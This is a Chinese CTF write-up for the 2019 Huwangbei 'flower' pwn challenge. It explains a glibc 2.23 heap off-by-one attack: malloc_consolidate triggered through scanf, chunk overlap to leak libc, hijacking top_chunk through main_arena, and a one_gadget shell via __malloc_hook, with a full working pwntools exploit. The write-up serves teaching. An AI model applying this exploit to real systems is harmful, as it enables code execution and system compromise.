> 原文链接: https://www.anquanke.com//post/id/186185 


# 护网杯 2019 pwn flower 详解


                                阅读量   
                                **531537**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">11</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t019e5cc3bb2e9a7cab.png)](https://p4.ssl.qhimg.com/t019e5cc3bb2e9a7cab.png)



这题的质量是真心不错，学到了很多东西，所以拿出来特地讲解一下。

源程序下载：[https://github.com/Ex-Origin/ctf-writeups/tree/master/huwangbei_2019/pwn/flower](https://github.com/Ex-Origin/ctf-writeups/tree/master/huwangbei_2019/pwn/flower) 。



## flower

靶机环境 glibc-2.23 。

```
void __cdecl read_n(_BYTE *a1, unsigned int a2)
`{`
  if ( a2 )
  `{`
    if ( (signed int)read(0, a1, a2) == 0x58LL )
      a1[0x58] = 0;
  `}`
`}`
```

非常明显的`off by one`漏洞，但是由于`size`限制为`size &gt; 0 &amp;&amp; size &lt;= 0x58`，所以使得程序的利用十分麻烦。



## scanf 触发 malloc_consolidate

由于size的限制，我们只能申请到`fastbin`，如果直接`off by one`会把size给踩没了，这样free的话会直接crash，而且不放进`unsorted bin`的话，我们也无法泄露地址，但是如何将chunk放入`unsorted bin`呢？

当`top_chunk`不够时，或者申请了一个`large bin`，也就是size大于`0x400`的chunk就能触发`malloc_consolidate`，使得`fastbin`合并，并且放入`unsorted bin`中。

这里用到了`scanf`的一个缓冲机制，当`scanf`的缓冲区不够用时，就会`malloc`一块更大的`chunk`来充当新的缓冲区，然后使用完之后在free掉，当我们的输入大于`0x400`时，自然会申请一块大于`0x400`的chunk来当缓冲区，正是这个申请可以触发`malloc_consolidate`。

```
for i in range(6):
    add(0x58, i, 'n')

for i in range(5):
    remove(i)

add(0x28, 4, 'n')


sh.sendlineafter('choice &gt;&gt; n', '0' * 0x400)
```

调试结果：

```
pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x1e0: 0x5649e1bc4000 —▸ 0x7fa5c69cad48 (main_arena+552) ◂— 0x5649e1bc4000
largebins
empty
```

这里的chunk被放入`smallbin`是因为申请`0x400`的chunk时，对`unsorted bin`进行了归位操作。



## 利用 malloc_consolidate 巧妙 unlink

虽然有`unsorted bin`可以用了，但是我们并没有一个size为`0x100`的chunk可以free，根据size的限制，我们也不可能申请到，那么该如何进行unlink呢，这里就要用到`malloc_consolidate`一个巧妙的地方。

**下面源码来自：glibc-2.23/malloc/malloc.c:4122**

```
static void malloc_consolidate(mstate av)
`{`
  mfastbinptr*    fb;                 /* current fastbin being consolidated */
  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */
  mchunkptr       p;                  /* current chunk being consolidated */
  mchunkptr       nextp;              /* next chunk to consolidate */
  mchunkptr       unsorted_bin;       /* bin header */
  mchunkptr       first_unsorted;     /* chunk to link to */

...

  /*
    If max_fast is 0, we know that av hasn't
    yet been initialized, in which case do so below
  */

  if (get_max_fast () != 0) `{`
    clear_fastchunks(av);

    unsorted_bin = unsorted_chunks(av);

    /*
      Remove each chunk from fast bin and consolidate it, placing it
      then in unsorted bin. Among other reasons for doing this,
      placing in unsorted bin avoids needing to calculate actual bins
      until malloc is sure that chunks aren't immediately going to be
      reused anyway.
    */

    maxfb = &amp;fastbin (av, NFASTBINS - 1);
    fb = &amp;fastbin (av, 0);
    do `{`
      p = atomic_exchange_acq (fb, 0);

      ...

    `}` while (fb++ != maxfb);
  `}`
  else `{`
    malloc_init_state(av);
    check_malloc_state(av);
  `}`
`}`
```

可以看到`malloc_consolidate`操作是从小的`fastbin`开始，然后逐渐转向大的，使他们都合并成`unsorted bin`，如果我们先把`size`的尾巴踩掉，使得该`unsorted bin`和后面的chunk`断片`，然后在申请一块较小的chunk，那么`malloc_consolidate`时，这块较小的chunk，会优先放入`unsorted bin`中，然后在合并后面断片的chunk时，`就会直接unlink`进行合并，那么我们就可以利用中间的chunk来进行 `chunk overlap` 的操作了。

```
add(0x58, 0, 'a' * 0x50 + p64(0x61))
add(0x18, 1, 'n')
add(0x50, 2, 'n')
add(0x48, 3, 'n')
remove(1)
remove(5)
add(0x48, 5, 'n')
sh.sendlineafter('choice &gt;&gt; n', '0' * 0x400)
```

合并之前的情况如下：

```
pwndbg&gt; bin
fastbins
0x20: 0x55f4dccbe060 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x55f4dccbe1e0 ◂— 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x30: 0x55f4dccbe130 —▸ 0x7f9325fd5b98 (main_arena+120) ◂— 0x55f4dccbe130
largebins
empty
pwndbg&gt; x/4gx 0x55f4dccbe060
0x55f4dccbe060:    0x0000000000000061    0x0000000000000021
0x55f4dccbe070:    0x0000000000000000    0x00007f9325fd5b78
pwndbg&gt; x/4gx 0x55f4dccbe1e0
0x55f4dccbe1e0:    0x0000000000000180    0x0000000000000060
0x55f4dccbe1f0:    0x0000000000000000    0x0000000000000000
pwndbg&gt;
```

根据我上面说的原理，`0x55f4dccbe060`和`0x55f4dccbe1e0`在`malloc_consolidate`会合并成一个大chunk。



## chunk overlap 泄露地址

简单的地址泄露。

```
add(0x18, 0, 'n')
add(0x18, 1, 'n')
show(2)
sh.recvuntil('flowers : ')
result = sh.recvuntil('1.', drop=True)
main_arena_addr = u64(result.ljust(8, '')) - 88
log.success('main_arena_addr: ' + hex(main_arena_addr))

libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x10)
log.success('libc_addr: ' + hex(libc_addr))
```



## 劫持 top_chunk

还是因为`size &gt; 0 &amp;&amp; size &lt;= 0x58`的限制，我们没有办法使用正常的`0x7f`size来劫持`__malloc_hook`，这时就需要我们想出新的办法来劫持hook。

`由于fastbin和top_chunk邻近`，而且fastbin一般都是`0x56....`（开了PIE）之类的，那么`size &gt; 0 &amp;&amp; size &lt;= 0x58`的限制刚好可以申请到这种size，所以我们利用`fastbin`的地址充当size，然后`malloc`出 `main_arena`，再劫持 `top_chunk` 。

```
remove(3)
remove(4)

add(0x38, 3, 'n')
add(0x50, 4, '' * 0x10 + p64(0) + p64(0x51) + p64(main_arena_addr + 0xd))

add(0x48, 1, 'n')
```

代码的调试信息如下：

```
pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x55d97cd32240 ◂— 0x0
0x40: 0x0
0x50: 0x7f11bd065b2d (main_arena+13) ◂— 0x11bd065b2d000000
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x55d97cd32120 —▸ 0x7f11bd065b78 (main_arena+88) ◂— 0x55d97cd32120
smallbins
empty
largebins
empty
pwndbg&gt; x/4gx 0x7f11bd065b2d
0x7f11bd065b2d &lt;main_arena+13&gt;:    0xd97cd32240000000    0x0000000000000055
0x7f11bd065b3d &lt;main_arena+29&gt;:    0x11bd065b2d000000    0x000000000000007f
```

可以看到我们已经可以拿出`main_arena`，由于只有当size为`0x0000000000000055`才能申请出来，所以几率应该是`1/3`。

然后我们可以将`top_chunk`指向`&lt;_IO_wide_data_0+296&gt;`，因为那里有一个`天然的size`：

```
pwndbg&gt; x/8gx 0x7ff5bb0bbb00-0x20-8
0x7ff5bb0bbad8 &lt;_IO_wide_data_0+280&gt;:    0x0000000000000000    0x0000000000000000
0x7ff5bb0bbae8 &lt;_IO_wide_data_0+296&gt;:    0x0000000000000000    0x00007ff5bb0ba260
0x7ff5bb0bbaf8:    0x0000000000000000    0x00007ff5bad7ce20
0x7ff5bb0bbb08 &lt;__realloc_hook&gt;:    0x00007ff5bad7ca00    0x0000000000000000
```



## 劫持hook

当我们成功劫持`top_chunk`后，只要把`unsorted bin`用完，那么程序就会从`top_chunk`里面切割内存给我们，这样我们就能劫持下面的`__malloc_hook`了。

```
add(0x48, 0, '' * 0x3b + p64(main_arena_addr - 0x28))
add(0x50, 2, 'n')
add(0x50, 2, 'n')
add(0x50, 2, 'n')
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
add(0x50, 2, p64(libc_addr + 0xf1147) + p64(libc_addr + libc.symbols['realloc'] + 20))

sh.sendlineafter('choice &gt;&gt; n', '1')
sh.sendlineafter('Size : ', str(1))
sh.sendlineafter('index: ', str(1))

sh.interactive()
```



## 完整代码

概率是`1/3` 。

```
#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols`{``}`* /tmp/gdb_pid`{``}`* /tmp/gdb_script`{``}`*'.replace('`{``}`', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols`{``}`.c'.replace('`{``}`', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols`{``}`.c -o /tmp/gdb_symbols`{``}`.so'.replace('`{``}`', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols`{``}`.c -o /tmp/gdb_symbols`{``}`.so'.replace('`{``}`', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'debug'
execve_file = './pwn'
# sh = process(execve_file, env=`{`'LD_PRELOAD': '/tmp/gdb_symbols`{``}`.so'.replace('`{``}`', salt)`}`)
sh = process(execve_file)
# sh = remote('152.136.21.148', 48138)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/12gx $rebase(0x02020A0)
        end

    b malloc
    '''

    f = open('/tmp/gdb_pid`{``}`'.replace('`{``}`', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script`{``}`'.replace('`{``}`', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def add(size, index, content):
    sh.sendlineafter('choice &gt;&gt; n', '1')
    sh.sendlineafter('Size : ', str(size))
    sh.sendlineafter('index: ', str(index))
    sh.sendafter('name:n', content)

def remove(index):
    sh.sendlineafter('choice &gt;&gt; n', '2')
    sh.sendlineafter('idx :', str(index))

def show(index):
    sh.sendlineafter('choice &gt;&gt; n', '3')
    sh.sendlineafter('idx :', str(index))

for i in range(6):
    add(0x58, i, 'n')

for i in range(5):
    remove(i)

add(0x28, 4, 'n')


sh.sendlineafter('choice &gt;&gt; n', '0' * 0x400)

add(0x58, 0, 'a' * 0x50 + p64(0x61))
add(0x18, 1, 'n')
add(0x50, 2, 'n')
add(0x48, 3, 'n')
remove(1)
remove(5)
add(0x48, 5, 'n')
sh.sendlineafter('choice &gt;&gt; n', '0' * 0x400)

add(0x18, 0, 'n')
add(0x18, 1, 'n')
show(2)
sh.recvuntil('flowers : ')
result = sh.recvuntil('1.', drop=True)
main_arena_addr = u64(result.ljust(8, '')) - 88
log.success('main_arena_addr: ' + hex(main_arena_addr))

libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x10)
log.success('libc_addr: ' + hex(libc_addr))

remove(3)
remove(4)

add(0x38, 3, 'n')
add(0x50, 4, '' * 0x10 + p64(0) + p64(0x51) + p64(main_arena_addr + 0xd))

add(0x48, 1, 'n')

add(0x48, 0, '' * 0x3b + p64(main_arena_addr - 0x28))
add(0x50, 2, 'n')
add(0x50, 2, 'n')
add(0x50, 2, 'n')
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
add(0x50, 2, p64(libc_addr + 0xf1147) + p64(libc_addr + libc.symbols['realloc'] + 20))

sh.sendlineafter('choice &gt;&gt; n', '1')
sh.sendlineafter('Size : ', str(1))
sh.sendlineafter('index: ', str(1))

sh.interactive()
clear()
```
